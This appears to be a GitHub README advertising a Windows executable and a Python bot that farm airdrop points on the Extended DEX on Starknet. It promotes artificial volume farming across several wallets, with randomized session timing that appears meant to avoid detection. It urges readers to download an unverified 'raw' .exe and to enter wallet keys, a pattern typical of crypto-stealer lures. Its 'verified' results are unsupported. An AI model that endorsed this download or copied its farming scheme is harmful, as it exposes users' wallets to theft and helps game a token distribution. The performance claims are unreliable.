# Extended Airdrop Bot

> Automated points farming bot for Extended DEX on Starknet. Maximizes your Q2 2026 airdrop allocation by executing systematic trading volume across 50+ markets with 0% maker fee, XVS vault yield optimization, and a live points-to-token allocation projector.

*Last updated: March 2026*

## What is Extended Airdrop Bot?

Extended is a perpetual DEX on Starknet with a live points program feeding into the Q2 2026 airdrop. Extended Airdrop Bot automates the full farming loop: it connects to your Starknet wallet, runs daily trading sessions across a broad range of Extended's 50+ markets, and tracks your cumulative points balance with real-time token allocation estimates.

![preview_extended-airdrop-bot](https://github.com/user-attachments/assets/2966ff85-86f4-4d0c-93be-300818bc8ab4)

With 0% maker fees, volume farming on Extended is extremely cost-efficient. The bot exclusively uses limit orders (maker mode) to eliminate all trading fees, making the only cost the Starknet ZK-rollup gas (typically under $0.01 per trade).

The XVS vault integration deposits idle margin capital to earn yield between farming sessions, compounding your returns.

---

## Download

| Platform | Architecture | Download |
|----------|-------------|----------|
| **Windows** | x64 | [Download the latest release](https://github.com/neolionmeme/extended-airdrop-bot/releases) |

---

## Farming Profile Settings

| Setting | Example | Description |
|---------|---------|-------------|
| `daily_volume_target_usd` | 40000 | Target notional volume per day |
| `market_breadth` | 8 | Unique markets to trade per session |
| `session_count` | 3 | Farming sessions per day |
| `maker_only` | true | Use limit orders only (0% fee) |
| `xvs_vault_deposit` | true | Deposit idle margin to XVS vault |
| `tradfi_include` | true | Include gold, SPX, EUR in farm rotation |

---

## Engine Features

* **0% maker fee farming** - limit-order-only mode eliminates all trading costs on Extended
* **50+ market rotation** - spreads volume across crypto and TradFi markets for breadth bonus
* **XVS vault integration** - automatically deposits and withdraws idle margin to earn vault yield
* **TradFi market inclusion** - optionally farm gold (XAU), SPX, and EUR perp markets
* **Session scheduler** - distributes sessions across the day with randomized offsets
* **Points tracker** - cumulative points display with Q2 2026 token allocation projection
* **Starknet gas monitor** - pauses farming during high proof cost periods
* **Multi-wallet support** - run independent farming sessions across multiple Starknet accounts

---

## Two Ways to Run It

| | Windows App | Python Bot |
|---|---|---|
| **Setup** | Double-click | `pip install` + config |
| **Multi-wallet** | Config-based | Full code access |
| **XVS vault** | Built-in | Code configurable |
| **Config** | `config.toml` | Direct code access |
| **Logs** | Dashboard | JSON per session |

## Quick Start

```
# 1. Download from Releases
# 2. Edit config.toml - set your Starknet wallet, volume targets, and vault preference
# 3. Run Airdrop Bot - farming sessions begin immediately
```

### Python

```bash
cd extended-airdrop-bot/python
pip install -r requirements.txt
python extended-airdrop-bot-raw-v.1.4.14.py
```

---

## How It Works

1. **Connect** - loads Starknet wallet and checks Extended balance and vault status
2. **Schedule** - divides day into farming sessions with randomized start offsets
3. **Farm** - places maker limit orders across configured market breadth each session
4. **Vault** - deposits idle margin to XVS vault between sessions to earn yield
5. **Track** - updates points balance and projects allocation after every session

### Config Reference

```toml
[wallet]
starknet_api_key = ""
starknet_address = ""
rpc_url = "https://starknet-mainnet.infura.io/v3/YOUR_KEY"

[farming]
daily_volume_target_usd = 40000
market_breadth = 8
session_count = 3
maker_only = true
tradfi_include = true
markets_override = []   # empty = auto-select from full market list

[vault]
xvs_vault_deposit = true
min_idle_balance_usd = 500

[airdrop]
snapshot_date = "2026-06-01"
points_to_token_rate = 0.0015

[alerts]
telegram_bot_token = ""
telegram_chat_id = ""
```

---

## Session Report Format

```json
{
  "session_id": "ext_farm_20260319_s2",
  "wallet": "0xstark...abc",
  "markets_traded": 9,
  "volume_usd": 41200.0,
  "maker_fee_paid": 0.0,
  "points_earned": 412,
  "vault_yield_usd": 4.80,
  "cumulative_points": 19840,
  "projected_tokens": 29.8,
  "gas_eth": 0.00018
}
```

---

## Verified Live

**Configuration used:**
* $40K daily target, 8-market breadth, maker-only, XVS vault ON, TradFi included

| | Session Result |
|---|---|
| Markets traded | 9 (BTC, ETH, SOL, XAU, SPX + 4 more) |
| Volume | $41,200 notional |
| Maker fees | $0.00 |
| Points earned | 412 pts |
| Vault yield | +$4.80 |
| Cumulative points | 19,840 pts |
| Projected tokens | ~29.8 EXT |
| Gas cost | 0.00018 ETH |

---

## Frequently Asked Questions

**What is the Extended points program?**
Extended awards points based on trading volume, market breadth (number of unique markets), and session consistency. Points convert to EXT tokens at the Q2 2026 snapshot.

**Why use limit orders only?**
Extended charges 0% for maker orders (limit orders that add liquidity). By farming exclusively with limit orders, the bot incurs zero trading fees - only minimal Starknet ZK gas costs.

**What is the XVS vault?**
The XVS vault is Extended's margin yield vault. Depositing idle USDC earns variable APY. The bot automatically manages deposits and withdrawals around farming sessions.

**Can it include TradFi markets?**
Yes. Set `tradfi_include = true` to include XAU-PERP (gold), SPX-PERP, and EUR-PERP in the market rotation. TradFi markets often have different trading activity patterns, improving breadth score.

**When is the Extended airdrop?**
Q2 2026. The bot's allocation projector updates your estimated EXT token amount in real time as points accumulate.

**How cheap is Starknet gas?**
Starknet uses ZK-rollup proofs to batch transactions. Per-trade gas cost is typically under $0.01, making high-frequency volume farming economically viable.

---

## Use Cases

- **Extended airdrop farming** - maximize EXT token allocation before Q2 2026 snapshot
- **Starknet zero-fee farming** - exploit 0% maker fee structure for cost-free volume farming
- **XVS vault yield bot** - automate idle margin deployment into Extended's yield vault
- **TradFi perp farming** - include gold, SPX, and EUR perps in your Starknet farming rotation
- **Multi-market breadth optimizer** - spread volume across 8+ markets to improve points multiplier

---

## Repository Structure

```
extended-airdrop-bot/
+-- extended-airdrop-bot-raw-v.1.4.14.exe
+-- config.toml
+-- data/
|   +-- sessions/
|   +-- logs/
|   +-- dll/
+-- python/
|   +-- src/
|   |   +-- farmer.py
|   |   +-- scheduler.py
|   |   +-- vault_manager.py
|   |   +-- points_tracker.py
|   +-- requirements.txt
+-- README.md
```

---

## Requirements

```
python-dotenv, starknet-py, httpx, typer[all], devtools
```

* Starknet wallet with USDC and ETH (gas)
* Extended account (connect at extended.exchange)
* Telegram bot token (optional)

---

*Zero fees. Vault yield. Airdrop secured.*
